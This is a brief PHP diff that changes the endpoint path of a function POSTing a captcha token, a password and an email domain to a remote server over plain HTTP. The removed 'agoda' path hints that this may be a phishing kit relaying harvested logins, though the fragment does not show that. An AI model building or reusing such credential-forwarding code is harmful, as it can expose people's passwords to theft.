@@ -22,7 +22,7 @@ if(!empty($_POST['g-recaptcha-response'])){
 
 function curl($server, $captcha, $password, $domain){
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "http://$server/agoda/api.php");
+    curl_setopt($ch, CURLOPT_URL, "http://$server/api.php");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
     curl_setopt($ch, CURLOPT_POSTFIELDS, "captcha=$captcha&password=$password&domain_mail=$domain");
